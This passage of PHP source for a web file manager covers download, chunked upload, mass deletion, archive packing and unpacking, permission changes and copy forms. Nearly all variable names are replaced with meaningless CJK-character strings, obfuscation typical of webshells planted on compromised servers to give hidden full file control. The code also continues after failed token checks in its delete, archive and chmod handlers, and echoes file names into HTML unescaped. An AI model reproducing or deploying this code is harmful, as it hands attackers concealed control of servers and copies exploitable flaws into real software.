    }
    $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
}

// Download
if (isset($_GET['dl'], $_POST['token'])) {
    // Verify the token to ensure it's valid
    if (!verifyToken($_POST['token'])) {
        fm_set_msg("Invalid Token.", 'error');
        exit;
    }

    // Clean the download file path
    $飦忋偧欍布銖紒紒垇銈 = urldecode($_GET['dl']);
    $飦忋偧欍布銖紒紒垇銈 = fm_clean_path($飦忋偧欍布銖紒紒垇銈);
    $飦忋偧欍布銖紒紒垇銈 = str_replace('/', '', $飦忋偧欍布銖紒紒垇銈); // Prevent directory traversal attacks

    // Define the file path
    $妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $妶慵銇偛沣垇锛笺劜珓 .= '/' . FM_PATH;
    }

    // Check if the file exists and is valid
    if ($飦忋偧欍布銖紒紒垇銈 != '' && is_file($妶慵銇偛沣垇锛笺劜珓 . '/' . $飦忋偧欍布銖紒紒垇銈)) {
        // Close the session to prevent session locking
        if (session_status() === PHP_SESSION_ACTIVE) {
            session_write_close();
        }

        // Call the download function
        fm_download_file($妶慵銇偛沣垇锛笺劜珓 . '/' . $飦忋偧欍布銖紒紒垇銈, $飦忋偧欍布銖紒紒垇銈, 1024); // Download with a buffer size of 1024 bytes
        exit;
    } else {
        // Handle the case where the file is not found
        fm_set_msg(lng('File not found'), 'error');
        $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
    }
}

// Upload
if (!empty($_FILES) && !FM_READONLY) {
    if (isset($_POST['token'])) {
        if (!verifyToken($_POST['token'])) {
            $傘屻併寔壖傦併梻嗐季 = array('status' => 'error', 'info' => "Invalid Token.");
            echo json_encode($傘屻併寔壖傦併梻嗐季);
            exit();
        }
    } else {
        $傘屻併寔壖傦併梻嗐季 = array('status' => 'error', 'info' => "Token Missing.");
        echo json_encode($傘屻併寔壖傦併梻嗐季);
        exit();
    }

    $銏悴傘粊銐併亖併欍亯 = $_POST['dzchunkindex'];
    $倎笺沣亯亖伒亗併勩併 = $_POST['dztotalchunkcount'];
    $沣銇亪倎沣銇亞増沣 = fm_clean_path($_REQUEST['fullpath']);

    $镢傘銇点镢亖镢垇笺粡 = $_FILES;
    $妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH;
    $层慵矎暩銇傘獊倎 = DIRECTORY_SEPARATOR;
    if (FM_PATH != '') {
        $妶慵銇偛沣垇锛笺劜珓 .= '/' . FM_PATH;
    }

    $紗憔椼併銏笺澆笂飯亖 = 0;
    $併倝镢忋伡珌併銇尟镲 = 0;
    $銈餀傦憧銇镢泔併搷銏 = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
    $傘屻併寔壖傦併梻嗐季 = array(
        'status' => 'error',
        'info'   => 'Oops! Try again'
    );

    $愕紕沣泔併矒倎墎患伡 = $镢傘銇点镢亖镢垇笺粡['file']['name'];
    $裤唩悻堛堬沣慵沣亗泔 = $镢傘銇点镢亖镢垇笺粡['file']['tmp_name'];
    $沣銈倐娿珎併墎壖併飦 = pathinfo($愕紕沣泔併矒倎墎患伡, PATHINFO_FILENAME) != '' ? strtolower(pathinfo($愕紕沣泔併矒倎墎患伡, PATHINFO_EXTENSION)) : '';
    $飦曘亖泔慵銇妬沣沣傦 = ($銈餀傦憧銇镢泔併搷銏) ? in_array($沣銈倐娿珎併墎壖併飦, $銈餀傦憧銇镢泔併搷銏) : true;

    if (!fm_isvalid_filename($愕紕沣泔併矒倎墎患伡) && !fm_isvalid_filename($沣銇亪倎沣銇亞増沣)) {
        $傘屻併寔壖傦併梻嗐季 = array(
            'status'    => 'error',
            'info'      => "Invalid File name!",
        );
        echo json_encode($傘屻併寔壖傦併梻嗐季);
        exit();
    }

    $併尶嫷亪亜銇沣剛悝倵 = $妶慵銇偛沣垇锛笺劜珓 . $层慵矎暩銇傘獊倎;
    if (is_writable($併尶嫷亪亜銇沣剛悝倵)) {
        $沣餀层併伂沣悴剢亪笺 = $妶慵銇偛沣垇锛笺劜珓 . '/' . $沣銇亪倎沣銇亞増沣;
        $慊侊銏仾銇唸倞珌嗐沣 = substr($沣餀层併伂沣悴剢亪笺, 0, strrpos($沣餀层併伂沣悴剢亪笺, "/"));

        if (!is_dir($慊侊銏仾銇唸倞珌嗐沣)) {
            $惘紒沣弬亖珦檨Φ焿沣 = umask(0);
            mkdir($慊侊銏仾銇唸倞珌嗐沣, 0777, true);
            umask($惘紒沣弬亖珦檨Φ焿沣);
        }

        if (empty($镢傘銇点镢亖镢垇笺粡['file']['error']) && !empty($裤唩悻堛堬沣慵沣亗泔) && $裤唩悻堛堬沣慵沣亗泔 != 'none' && $飦曘亖泔慵銇妬沣沣傦) {
            if ($倎笺沣亯亖伒亗併勩併) {
                $沣傦銇亗併飦撱硷銤併 = @fopen("{$沣餀层併伂沣悴剢亪笺}.part", $銏悴傘粊銐併亖併欍亯 == 0 ? "wb" : "ab");
                if ($沣傦銇亗併飦撱硷銤併) {
                    $伈沣堛亖飩亖裤嗐笺伃 = @fopen($裤唩悻堛堬沣慵沣亗泔, "rb");
                    if ($伈沣堛亖飩亖裤嗐笺伃) {
                        if (PHP_VERSION_ID < 80009) {
                            // workaround https://bugs.php.net/bug.php?id=81145
                            do {
                                for (;;) {
                                    $伝沣唹銑併沣垇飦伨悛 = fread($伈沣堛亖飩亖裤嗐笺伃, 4096);
                                    if ($伝沣唹銑併沣垇飦伨悛 === false || $伝沣唹銑併沣垇飦伨悛 === '') {
                                        break;
                                    }
                                    fwrite($沣傦銇亗併飦撱硷銤併, $伝沣唹銑併沣垇飦伨悛);
                                }
                            } while (!feof($伈沣堛亖飩亖裤嗐笺伃));
                        } else {
                            stream_copy_to_stream($伈沣堛亖飩亖裤嗐笺伃, $沣傦銇亗併飦撱硷銤併);
                        }
                        $傘屻併寔壖傦併梻嗐季 = array(
                            'status'    => 'success',
                            'info' => "file upload successful"
                        );
                    } else {
                        $傘屻併寔壖傦併梻嗐季 = array(
                            'status'    => 'error',
                            'info' => "failed to open output stream",
                            'errorDetails' => error_get_last()
                        );
                    }
                    @fclose($伈沣堛亖飩亖裤嗐笺伃);
                    @fclose($沣傦銇亗併飦撱硷銤併);
                    @unlink($裤唩悻堛堬沣慵沣亗泔);

                    $傘屻併寔壖傦併梻嗐季 = array(
                        'status'    => 'success',
                        'info' => "file upload successful"
                    );
                } else {
                    $傘屻併寔壖傦併梻嗐季 = array(
                        'status'    => 'error',
                        'info' => "failed to open output stream"
                    );
                }

                if ($銏悴傘粊銐併亖併欍亯 == $倎笺沣亯亖伒亗併勩併 - 1) {
                    if (file_exists($沣餀层併伂沣悴剢亪笺)) {
                        $亖沣亪併沣瞾矂矈濄傘 = $沣銈倐娿珎併墎壖併飦 ? '.' . $沣銈倐娿珎併墎壖併飦 : '';
                        $镢笺暭併悴銇泔矇銇汇 = $妶慵銇偛沣垇锛笺劜珓 . '/' . basename($沣銇亪倎沣銇亞増沣, $亖沣亪併沣瞾矂矈濄傘) . '_' . date('ymdHis') . $亖沣亪併沣瞾矂矈濄傘;
                    } else {
                        $镢笺暭併悴銇泔矇銇汇 = $沣餀层併伂沣悴剢亪笺;
                    }
                    rename("{$沣餀层併伂沣悴剢亪笺}.part", $镢笺暭併悴銇泔矇銇汇);
                }
            } else if (move_uploaded_file($裤唩悻堛堬沣慵沣亗泔, $沣餀层併伂沣悴剢亪笺)) {
                // Be sure that the file has been uploaded
                if (file_exists($沣餀层併伂沣悴剢亪笺)) {
                    $傘屻併寔壖傦併梻嗐季 = array(
                        'status'    => 'success',
                        'info' => "file upload successful"
                    );
                } else {
                    $傘屻併寔壖傦併梻嗐季 = array(
                        'status' => 'error',
                        'info'   => 'Couldn\'t upload the requested file.'
                    );
                }
            } else {
                $傘屻併寔壖傦併梻嗐季 = array(
                    'status'    => 'error',
                    'info'      => "Error while uploading files. Uploaded files $併倝镢忋伡珌併銇尟镲",
                );
            }
        }
    } else {
        $傘屻併寔壖傦併梻嗐季 = array(
            'status' => 'error',
            'info'   => 'The specified folder for upload isn\'t writeable.'
        );
    }
    // Return the response
    echo json_encode($傘屻併寔壖傦併梻嗐季);
    exit();
}

// Mass deleting
if (isset($_POST['group'], $_POST['delete'], $_POST['token']) && !FM_READONLY) {

    if (!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $妶慵銇偛沣垇锛笺劜珓 .= '/' . FM_PATH;
    }

    $紗憔椼併銏笺澆笂飯亖 = 0;
    $飩併伡併銖慊傘壖銇亗 = $_POST['file'];
    if (is_array($飩併伡併銖慊傘壖銇亗) && count($飩併伡併銖慊傘壖銇亗)) {
        foreach ($飩併伡併銖慊傘壖銇亗 as $镢傘銇点镢亖镢垇笺粡) {
            if ($镢傘銇点镢亖镢垇笺粡 != '') {
                $亖瞾紞併瞾笺併沣倞亞 = $妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡;
                if (!fm_rdelete($亖瞾紞併瞾笺併沣倞亞)) {
                    $紗憔椼併銏笺澆笂飯亖++;
                }
            }
        }
        if ($紗憔椼併銏笺澆笂飯亖 == 0) {
            fm_set_msg(lng('Selected files and folder deleted'));
        } else {
            fm_set_msg(lng('Error while deleting items'), 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }

    $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
}

// Pack files zip, tar
if (isset($_POST['group'], $_POST['token']) && (isset($_POST['zip']) || isset($_POST['tar'])) && !FM_READONLY) {

    if (!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH;
    $沣銈倐娿珎併墎壖併飦 = 'zip';
    if (FM_PATH != '') {
        $妶慵銇偛沣垇锛笺劜珓 .= '/' . FM_PATH;
    }

    //set pack type
    $沣銈倐娿珎併墎壖併飦 = isset($_POST['tar']) ? 'tar' : 'zip';

    if (($沣銈倐娿珎併墎壖併飦 == "zip" && !class_exists('ZipArchive')) || ($沣銈倐娿珎併墎壖併飦 == "tar" && !class_exists('PharData'))) {
        fm_set_msg(lng('Operations with archives are not available'), 'error');
        $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
    }

    $飩併伡併銖慊傘壖銇亗 = $_POST['file'];
    $亗紒堬亗侊沣搞緛层 = array();

    // clean path
    foreach ($飩併伡併銖慊傘壖銇亗 as $慊銇愕仚剚亗焷獋亖銇) {
        array_push($亗紒堬亗侊沣搞緛层, fm_clean_path($慊銇愕仚剚亗焷獋亖銇));
    }

    $飩併伡併銖慊傘壖銇亗 = $亗紒堬亗侊沣搞緛层;

    if (!empty($飩併伡併銖慊傘壖銇亗)) {
        chdir($妶慵銇偛沣垇锛笺劜珓);

        if (count($飩併伡併銖慊傘壖銇亗) == 1) {
            $紒裤亗併併墕傘倎笺沣 = reset($飩併伡併銖慊傘壖銇亗);
            $紒裤亗併併墕傘倎笺沣 = basename($紒裤亗併併墕傘倎笺沣);
            $銈侊併壖悴憧銑餄亖傘 = $紒裤亗併併墕傘倎笺沣 . '_' . date('ymd_His') . '.' . $沣銈倐娿珎併墎壖併飦;
        } else {
            $銈侊併壖悴憧銑餄亖傘 = 'archive_' . date('ymd_His') . '.' . $沣銈倐娿珎併墎壖併飦;
        }

        if ($沣銈倐娿珎併墎壖併飦 == 'zip') {
            $偒沣銐倎撅嗐併銐镲亖 = new FM_Zipper();
            $亖伡忋泔汇紒墪紛伡檪 = $偒沣銐倎撅嗐併銐镲亖->create($銈侊併壖悴憧銑餄亖傘, $飩併伡併銖慊傘壖銇亗);
        } elseif ($沣銈倐娿珎併墎壖併飦 == 'tar') {
            $獊併慵晧矙銇层啛妬几 = new FM_Zipper_Tar();
            $亖伡忋泔汇紒墪紛伡檪 = $獊併慵晧矙銇层啛妬几->create($銈侊併壖悴憧銑餄亖傘, $飩併伡併銖慊傘壖銇亗);
        }

        if ($亖伡忋泔汇紒墪紛伡檪) {
            fm_set_msg(sprintf(lng('Archive') . ' <b>%s</b> ' . lng('Created'), fm_enc($銈侊併壖悴憧銑餄亖傘)));
        } else {
            fm_set_msg(lng('Archive not created'), 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }

    $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
}

// Unpack zip, tar
if (isset($_POST['unzip'], $_POST['token']) && !FM_READONLY) {

    if (!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $夛濄亪銇銇慊銇憔 = urldecode($_POST['unzip']);
    $夛濄亪銇銇慊銇憔 = fm_clean_path($夛濄亪銇銇慊銇憔);
    $夛濄亪銇銇慊銇憔 = str_replace('/', '', $夛濄亪銇銇慊銇憔);
    $倎亗墎飰銖亗嬶革泔裤 = false;

    $妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $妶慵銇偛沣垇锛笺劜珓 .= '/' . FM_PATH;
    }

    if ($夛濄亪銇銇慊銇憔 != '' && is_file($妶慵銇偛沣垇锛笺劜珓 . '/' . $夛濄亪銇銇慊銇憔)) {
        $亞銇併汇憧檨銇銇沣 = $妶慵銇偛沣垇锛笺劜珓 . '/' . $夛濄亪銇銇慊銇憔;
        $沣銈倐娿珎併墎壖併飦 = pathinfo($亞銇併汇憧檨銇銇沣, PATHINFO_EXTENSION);
        $倎亗墎飰銖亗嬶革泔裤 = true;
    } else {
        fm_set_msg(lng('File not found'), 'error');
    }

    if (($沣銈倐娿珎併墎壖併飦 == "zip" && !class_exists('ZipArchive')) || ($沣銈倐娿珎併墎壖併飦 == "tar" && !class_exists('PharData'))) {
        fm_set_msg(lng('Operations with archives are not available'), 'error');
        $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
    }

    if ($倎亗墎飰銖亗嬶革泔裤) {
        //to folder
        $銇屻亞偧倐垇銊銏垑焿 = '';
        if (isset($_POST['tofolder'])) {
            $銇屻亞偧倐垇銊銏垑焿 = pathinfo($亞銇併汇憧檨銇銇沣, PATHINFO_FILENAME);
            if (fm_mkdir($妶慵銇偛沣垇锛笺劜珓 . '/' . $銇屻亞偧倐垇銊銏垑焿, true)) {
                $妶慵銇偛沣垇锛笺劜珓 .= '/' . $銇屻亞偧倐垇銊銏垑焿;
            }
        }

        if ($沣銈倐娿珎併墎壖併飦 == "zip") {
            $偒沣銐倎撅嗐併銐镲亖 = new FM_Zipper();
            $亖伡忋泔汇紒墪紛伡檪 = $偒沣銐倎撅嗐併銐镲亖->unzip($亞銇併汇憧檨銇銇沣, $妶慵銇偛沣垇锛笺劜珓);
        } elseif ($沣銈倐娿珎併墎壖併飦 == "tar") {
            try {
                $沣祲亞銇紒沪瓉墎慵沣 = new PharData($亞銇併汇憧檨銇銇沣);
                if (@$沣祲亞銇紒沪瓉墎慵沣->extractTo($妶慵銇偛沣垇锛笺劜珓, null, true)) {
                    $亖伡忋泔汇紒墪紛伡檪 = true;
                } else {
                    $亖伡忋泔汇紒墪紛伡檪 = false;
                }
            } catch (Exception $銇娿慵紙亖垇亞侊銈沣) {
                //TODO:: need to handle the error
                $亖伡忋泔汇紒墪紛伡檪 = true;
            }
        }

        if ($亖伡忋泔汇紒墪紛伡檪) {
            fm_set_msg(lng('Archive unpacked'));
        } else {
            fm_set_msg(lng('Archive not unpacked'), 'error');
        }
    } else {
        fm_set_msg(lng('File not found'), 'error');
    }
    $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
}

// Change Perms (not for Windows)
if (isset($_POST['chmod'], $_POST['token']) && !FM_READONLY && !FM_IS_WIN) {

    if (!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $妶慵銇偛沣垇锛笺劜珓 .= '/' . FM_PATH;
    }

    $慊銇愕仚剚亗焷獋亖銇 = $_POST['chmod'];
    $慊銇愕仚剚亗焷獋亖銇 = fm_clean_path($慊銇愕仚剚亗焷獋亖銇);
    $慊銇愕仚剚亗焷獋亖銇 = str_replace('/', '', $慊銇愕仚剚亗焷獋亖銇);
    if ($慊銇愕仚剚亗焷獋亖銇 == '' || (!is_file($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇) && !is_dir($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇))) {
        fm_set_msg(lng('File not found'), 'error');
        $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
    }

    $寛侊患喐伎獊崄亖亖銐 = 0;
    if (!empty($_POST['ur'])) {
        $寛侊患喐伎獊崄亖亖銐 |= 0400;
    }
    if (!empty($_POST['uw'])) {
        $寛侊患喐伎獊崄亖亖銐 |= 0200;
    }
    if (!empty($_POST['ux'])) {
        $寛侊患喐伎獊崄亖亖銐 |= 0100;
    }
    if (!empty($_POST['gr'])) {
        $寛侊患喐伎獊崄亖亖銐 |= 0040;
    }
    if (!empty($_POST['gw'])) {
        $寛侊患喐伎獊崄亖亖銐 |= 0020;
    }
    if (!empty($_POST['gx'])) {
        $寛侊患喐伎獊崄亖亖銐 |= 0010;
    }
    if (!empty($_POST['or'])) {
        $寛侊患喐伎獊崄亖亖銐 |= 0004;
    }
    if (!empty($_POST['ow'])) {
        $寛侊患喐伎獊崄亖亖銐 |= 0002;
    }
    if (!empty($_POST['ox'])) {
        $寛侊患喐伎獊崄亖亖銐 |= 0001;
    }

    if (@chmod($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇, $寛侊患喐伎獊崄亖亖銐)) {
        fm_set_msg(lng('Permissions changed'));
    } else {
        fm_set_msg(lng('Permissions not changed'), 'error');
    }

    $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
}

/*************************** ACTIONS ***************************/

// get current path
$妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH;
if (FM_PATH != '') {
    $妶慵銇偛沣垇锛笺劜珓 .= '/' . FM_PATH;
}

// check path
if (!is_dir($妶慵銇偛沣垇锛笺劜珓)) {
    fm_redirect(FM_SELF_URL . '?p=');
}

// get parent folder
$銌偀亖亰慵併銇併銇 = fm_get_parent_path(FM_PATH);

$沣倱亯併倓倎檨併悛裤 = is_readable($妶慵銇偛沣垇锛笺劜珓) ? scandir($妶慵銇偛沣垇锛笺劜珓) : array();
$銚銑竵銇垇銦亖勩傘锃 = array();
$飩併伡併銖慊傘壖銇亗 = array();
$沣憔亖銊併銇搞伡瑏垇 = array_slice(explode("/", $妶慵銇偛沣垇锛笺劜珓), -1)[0];
if (is_array($沣倱亯併倓倎檨併悛裤) && fm_is_exclude_items($沣憔亖銊併銇搞伡瑏垇)) {
    foreach ($沣倱亯併倓倎檨併悛裤 as $慊銇愕仚剚亗焷獋亖銇) {
        if ($慊銇愕仚剚亗焷獋亖銇 == '.' || $慊銇愕仚剚亗焷獋亖銇 == '..') {
            continue;
        }
        if (!FM_SHOW_HIDDEN && substr($慊銇愕仚剚亗焷獋亖銇, 0, 1) === '.') {
            continue;
        }
        $亖瞾紞併瞾笺併沣倞亞 = $妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇;
        if (@is_file($亖瞾紞併瞾笺併沣倞亞) && fm_is_exclude_items($慊銇愕仚剚亗焷獋亖銇)) {
            $飩併伡併銖慊傘壖銇亗[] = $慊銇愕仚剚亗焷獋亖銇;
        } elseif (@is_dir($亖瞾紞併瞾笺併沣倞亞) && $慊銇愕仚剚亗焷獋亖銇 != '.' && $慊銇愕仚剚亗焷獋亖銇 != '..' && fm_is_exclude_items($慊銇愕仚剚亗焷獋亖銇)) {
            $銚銑竵銇垇銦亖勩傘锃[] = $慊銇愕仚剚亗焷獋亖銇;
        }
    }
}

if (!empty($飩併伡併銖慊傘壖銇亗)) {
    natcasesort($飩併伡併銖慊傘壖銇亗);
}
if (!empty($銚銑竵銇垇銦亖勩傘锃)) {
    natcasesort($銚銑竵銇垇銦亖勩傘锃);
}

// upload form
if (isset($_GET['upload']) && !FM_READONLY) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    //get the allowed file extensions
    function getUploadExt()
    {
        $沣銇張夛銐垇夈銇夈併 = explode(',', FM_UPLOAD_EXTENSION);
        if (FM_UPLOAD_EXTENSION && $沣銇張夛銐垇夈銇夈併) {
            array_walk($沣銇張夛銐垇夈銇夈併, function (&$紓欍搞粊寔惘崄伡併崄) {
                $紓欍搞粊寔惘崄伡併崄 = ".$紓欍搞粊寔惘崄伡併崄";
            });
            return implode(',', $沣銇張夛銐垇夈銇夈併);
        }
        return '';
    }
    ?>
    <?php 
print_external('css-dropzone'); ?>
    <div class="path">

        <div class="card mb-2 fm-upload-wrapper" data-bs-theme="<?php 
echo FM_THEME; ?>">
            <div class="card-header">
                <ul class="nav nav-tabs card-header-tabs">
                    <li class="nav-item">
                        <a class="nav-link active" href="#fileUploader" data-target="#fileUploader"><i class="fa fa-arrow-circle-o-up"></i> <?php 
echo lng('UploadingFiles') ?></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader"><i class="fa fa-link"></i> <?php 
echo lng('Upload from URL') ?></a>
                    </li>
                </ul>
            </div>
            <div class="card-body">
                <p class="card-text">
                    <a href="?p=<?php 
echo FM_PATH ?>" class="float-right"><i class="fa fa-chevron-circle-left go-back"></i> <?php 
echo lng('Back') ?></a>
                    <strong><?php 
echo lng('DestinationFolder') ?></strong>: <?php 
echo fm_enc(fm_convert_win(FM_PATH)) ?>
                </p>

                <form action="<?php 
echo htmlspecialchars(FM_SELF_URL) . '?p=' . fm_enc(FM_PATH) ?>" class="dropzone card-tabs-container" id="fileUploader" enctype="multipart/form-data">
                    <input type="hidden" name="p" value="<?php 
echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="fullpath" id="fullpath" value="<?php 
echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                    <div class="fallback">
                        <input name="file" type="file" multiple />
                    </div>
                </form>

                <div class="upload-url-wrapper card-tabs-container hidden" id="urlUploader">
                    <form id="js-form-url-upload" class="row row-cols-lg-auto g-3 align-items-center" onsubmit="return upload_from_url(this);" method="POST" action="">
                        <input type="hidden" name="type" value="upload" aria-label="hidden" aria-hidden="true">
                        <input type="url" placeholder="URL" name="uploadurl" required class="form-control" style="width: 80%">
                        <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                        <button type="submit" class="btn btn-primary ms-3"><?php 
echo lng('Upload') ?></button>
                        <div class="lds-facebook">
                            <div></div>
                            <div></div>
                            <div></div>
                        </div>
                    </form>
                    <div id="js-url-upload__list" class="col-9 mt-3"></div>
                </div>
            </div>
        </div>
    </div>
    <?php 
print_external('js-dropzone'); ?>
    <script>
        Dropzone.options.fileUploader = {
            chunking: true,
            chunkSize: <?php 
echo UPLOAD_CHUNK_SIZE; ?>,
            forceChunking: true,
            retryChunks: true,
            retryChunksLimit: 3,
            parallelUploads: 1,
            parallelChunkUploads: false,
            timeout: 120000,
            maxFilesize: "<?php 
echo MAX_UPLOAD_SIZE; ?>",
            acceptedFiles: "<?php 
echo getUploadExt() ?>",
            init: function() {
                this.on("sending", function(file, xhr, formData) {
                    let _path = (file.fullPath) ? file.fullPath : file.name;
                    document.getElementById("fullpath").value = _path;
                    xhr.ontimeout = (function() {
                        toast('Error: Server Timeout');
                    });
                }).on("success", function(res) {
                    try {
                        let _response = JSON.parse(res.xhr.response);

                        if (_response.status == "error") {
                            toast(_response.info);
                        }
                    } catch (e) {
                        toast("Error: Invalid JSON response");
                    }
                }).on("error", function(file, response) {
                    toast(response);
                });
            }
        }
    </script>
<?php

    fm_show_footer();
    exit;
}

// copy form POST
if (isset($_POST['copy']) && !FM_READONLY) {
    $創銞伙伈亜墘蓟沣獜倽 = isset($_POST['file']) ? $_POST['file'] : null;
    if (!is_array($創銞伙伈亜墘蓟沣獜倽) || empty($創銞伙伈亜墘蓟沣獜倽)) {
        fm_set_msg(lng('Nothing selected'), 'alert');
        $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
?>
    <div class="path">
        <div class="card" data-bs-theme="<?php 
echo FM_THEME; ?>">
            <div class="card-header">
                <h6><?php 
echo lng('Copying') ?></h6>
            </div>
            <div class="card-body">
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php 
echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="finish" value="1">
                    <?php

                    foreach ($創銞伙伈亜墘蓟沣獜倽 as $伨傘銐檨銇銐泔裤併墝) {
                        echo '<input type="hidden" name="file[]" value="' . fm_enc($伨傘銐檨銇銐泔裤併墝) . '">' . PHP_EOL;
                    }
                    ?>
                    <p class="break-word"><strong><?php 
echo lng('Files') ?></strong>: <b><?php 
echo implode('</b>, <b>', $創銞伙伈亜墘蓟沣獜倽) ?></b></p>
                    <p class="break-word"><strong><?php 
echo lng('SourceFolder') ?></strong>: <?php 
echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?><br>
                        <label for="inp_copy_to"><strong><?php 
echo lng('DestinationFolder') ?></strong>:</label>
                        <?php 
echo FM_ROOT_PATH ?>/<input type="text" name="copy_to" id="inp_copy_to" value="<?php 
echo fm_enc(FM_PATH) ?>">
                    </p>
                    <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input">
                        <label for="js-move-files" class="custom-control-label ms-2"><?php 
echo lng('Move') ?></label>
                    </p>
                    <p>
                        <b><a href="?p=<?php 
echo urlencode(FM_PATH) ?>" class="btn btn-outline-danger"><i class="fa fa-times-circle"></i> <?php 
echo lng('Cancel') ?></a></b>&nbsp;
                        <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php 
echo lng('Copy') ?></button>
                    </p>
                </form>
            </div>
        </div>
    </div>
<?php

    fm_show_footer();
    exit;
}

// copy form
if (isset($_GET['copy']) && !isset($_GET['finish']) && !FM_READONLY) {
    $沣剛繖銏夈泔︼姉唩 = $_GET['copy'];
    $沣剛繖銏夈泔︼姉唩 = fm_clean_path($沣剛繖銏夈泔︼姉唩);
    if ($沣剛繖銏夈泔︼姉唩 == '' || !file_exists(FM_ROOT_PATH . '/' . $沣剛繖銏夈泔︼姉唩)) {
        fm_set_msg(lng('File not found'), 'error');
        $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
?>
    <div class="path">
        <p><b>Copying</b></p>
        <p class="break-word">
            <strong>Source path:</strong> <?php 
echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . $沣剛繖銏夈泔︼姉唩)) ?><br>
            <strong>Destination folder:</strong> <?php 
echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?>
        </p>
        <p>
            <b><a href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;copy=<?php 
echo urlencode($沣剛繖銏夈泔︼姉唩) ?>&amp;finish=1"><i class="fa fa-check-circle"></i> Copy</a></b> &nbsp;
            <b><a href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;copy=<?php 
echo urlencode($沣剛繖銏夈泔︼姉唩) ?>&amp;finish=1&amp;move=1"><i class="fa fa-check-circle"></i> Move</a></b> &nbsp;
            <b><a href="?p=<?php 
echo urlencode(FM_PATH) ?>" class="text-danger"><i class="fa fa-times-circle"></i> Cancel</a></b>
        </p>
        <p><i><?php 
echo lng('Select folder') ?></i></p>
        <ul class="folders break-word">
            <?php

            if ($銌偀亖亰慵併銇併銇 !== false) {
            ?>
                <li><a href="?p=<?php 
echo urlencode($銌偀亖亰慵併銇併銇) ?>&amp;copy=<?php 
echo urlencode($沣剛繖銏夈泔︼姉唩) ?>"><i class="fa fa-chevron-circle-left"></i> ..</a></li>
            <?php

            }
            foreach ($銚銑竵銇垇銦亖勩傘锃 as $镢傘銇点镢亖镢垇笺粡) {
            ?>
                <li>
                    <a href="?p=<?php 
echo urlencode(trim(FM_PATH . '/' . $镢傘銇点镢亖镢垇笺粡, '/')) ?>&amp;copy=<?php 
